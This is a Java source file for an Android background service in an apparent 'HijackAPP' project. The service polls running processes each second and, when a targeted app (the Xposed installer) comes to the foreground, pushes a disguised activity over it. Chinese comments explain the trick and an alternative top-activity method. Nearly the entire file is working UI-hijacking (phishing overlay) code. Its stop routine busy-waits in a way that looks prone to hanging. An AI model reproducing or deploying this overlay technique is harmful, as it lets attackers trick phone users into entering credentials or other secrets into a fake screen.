package com.sy.hijackapp.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import com.sy.hijackapp.activity.HijackActivity;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * @program: HijackAPP
 * @description: 定时枚举当前运行的进程，若目标Activity，则弹出伪装界面
 * @author: yao.song
 * @create: 2018-12-18 11:36
 **/
public class HijackService extends Service {

    public static String TAG = "HijackAPP";

    private long delayMillis = 1000;//枚举间隔时间

    private boolean hasStarted = false;//是否已经启动。防止多个启动Intent

    private boolean stopService = false;//停止枚举线程的标志位

    private HashMap<String, Class<?>> hijackAppMap = new HashMap<>();//保存要劫持的app信息

    private List<String> hijackedAppList = new ArrayList();//保存已劫持的app信息

    private Handler handler = new Handler();//执行枚举的handler

    private Runnable mTask = new Runnable() {

        /**
         * 在Android系统当中，程序可以枚举当前运行的进程而不需要声明其他权限。
         * 这样子我们就可以写一个程序，启动一个后台的服务，这个服务不断地扫描当前运行的进程，当发现目标进程启动时，就启动一个伪装的Activity。
         */
        @Override
        public void run() {
            if (stopService) {
                hasStarted = false;
                return;
            }

            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);


            //劫持方式一：枚举指定栈顶Activity
//            //getRunningTasks会返回一个List，List的大小等于传入的参数。
//            //get(0)可获得List中的第一个元素，即栈顶的task
//            ActivityManager.RunningTaskInfo info = activityManager.getRunningTasks(1).get(0);
//            //类名，如.views.login.GetbackPasswordActivity
//            //String shortClassName = info.topActivity.getShortClassName();
//            //完整类名，如com.changhong.ework.views.login.GetbackPasswordActivity
//            String className = info.topActivity.getClassName();
//            //包名，如com.changhong.ework
//            //String packageName = info.topActivity.getPackageName();
//            if (hijackAppMap.containsKey(className)) {
//                // 进行劫持
//                hijacking(className);
//            } else {
//                Log.w(TAG, className);
//            }


            //劫持方式二：枚举指定前台进程
            List<ActivityManager.RunningAppProcessInfo> appProcessInfos = activityManager.getRunningAppProcesses();
            Log.w(TAG, "正在枚举进程");
            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfos) {

                //IMPORTANCE_FOREGROUND：这个进程正在运行前台UI，也就是说，它是当前在屏幕顶部的东西，用户正在进行交互的而进程
                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    if (hijackAppMap.containsKey(appProcessInfo.processName)) {
                        // 进行劫持
                        hijacking(appProcessInfo.processName);
                    } else {
                        Log.w(TAG, appProcessInfo.processName);
                    }
                }
            }

            handler.postDelayed(mTask, delayMillis);
        }

        /**
         * 进行劫持。如果在启动一个Activity时，给它加入一个标志位FLAG_ACTIVITY_NEW_TASK，就能使它置于栈顶并立马呈现给用户。
         * @param processName
         */
        private void hijacking(String processName) {
            if (hijackedAppList.contains(processName) == false) {
                Log.w(TAG, "正在劫持：" + processName);

                Intent intent = new Intent(getBaseContext(), hijackAppMap.get(processName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getApplication().startActivity(intent);
                hijackedAppList.add(processName);

                Log.w(TAG, "劫持成功：" + processName);
            }
        }
    };

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        safeStopHijack();
        safeStartHijack();

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        safeStopHijack();

        super.onDestroy();
    }

    private void safeStopHijack() {
        if (hasStarted) {
            stopService = true;
            hijackedAppList.clear();
            while (hasStarted) {
                //循环等待线程退出
            }
        }
    }

    private void safeStartHijack() {
        //放入劫持app的数据
        hijackAppMap.put("de.robv.android.xposed.installer", HijackActivity.class);
        //开启枚举线程
        stopService = false;
        handler.postDelayed(mTask, delayMillis);

        hasStarted = true;
    }


}
